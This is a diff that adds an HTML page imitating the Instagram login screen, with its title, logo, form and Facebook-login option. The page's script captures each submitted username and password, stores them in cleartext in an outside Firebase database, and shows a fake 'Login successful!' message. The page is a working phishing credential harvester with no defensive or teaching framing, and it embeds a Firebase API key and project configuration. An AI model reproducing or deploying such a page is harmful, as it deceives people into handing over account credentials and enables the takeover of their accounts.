@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log in &#128900 Instagram</title>
+  <link rel="icon" href="assets/ig-icon.png">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+  <link rel="stylesheet" href="style.css">
+
+  <!-- Import Firebase from the CDN -->
+  <script type="module">
+    // Import Firebase SDK (modular version for v9+)
+    import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js';
+    import { getDatabase, ref, set } from 'https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js';
+
+
+    // Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyD09JRo59UJH7vP-H9ru19IG3WMZcpq6Gw",
+      authDomain: "instagram00-13678.firebaseapp.com",
+      databaseURL: "https://instagram00-13678-default-rtdb.firebaseio.com",
+      projectId: "instagram00-13678",
+      storageBucket: "instagram00-13678.firebasestorage.app",
+      messagingSenderId: "386681120721",
+      appId: "1:386681120721:web:5a827576b8fbec0a7962f0"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+
+    // Handle form submission
+    document.addEventListener('DOMContentLoaded', function() {
+      document.getElementById('loginForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+        
+        // Set data in Firebase Realtime Database (use the modular functions)
+        const userRef = ref(database, 'users/' + username);
+        set(userRef, {
+          password: password
+        }).then(function() {
+          alert('Login successful!');
+        }).catch(function(error) {
+          alert('Error: ' + error.message);
+        });
+      });
+    });
+  </script>
+
+</head>
+<body>
+  <section>
+    <div class="container">
+      <div class="login">
+        <div class="logo">
+          <img src="assets/ig-logo.png">
+        </div>
+        <form method="get" id="loginForm">
+          <div>
+            <input type="text" id="username" name="username" placeholder="Phone number, email or username" required>
+          </div>
+          <div class="login">
+            <div class="password-wrapper">
+              <input type="password" id="password" name="password" placeholder="Password" required>
+              <i class="fa fa-eye" id="togglePassword"></i>
+            </div>
+          </div>
+          <button type="submit" id="loginBtn">Login</button>
+          <div class="forgot-details">
+            <h3>Forgot your login details? <a href="index.php">Get help logging in.</a></h3>
+          </div>
+          <div class="separator">
+            <h1>OR</h1>
+          </div>
+          <div class="login-facebook">
+            <h2>Log in with Facebook</h2>
+          </div>
+        </form>
+      </div>
+    </div>
+    <div class="signup">
+      <h3>Don't have an account? <a href="index.php">Sign up.</a></h3>
+    </div>
+  </section>
+
+  <script>
+    const togglePassword = document.querySelector("#togglePassword");
+    const pass = document.querySelector("#password");
+
+    togglePassword.addEventListener("click", function () {
+      // Toggle the type attribute
+      const type = pass.getAttribute("type") === "password" ? "text" : "password";
+      pass.setAttribute("type", type);
+
+      // Toggle the eye icon
+      this.classList.toggle("fa-eye-slash");
+    });
+  </script>
+
+</body>
+</html>
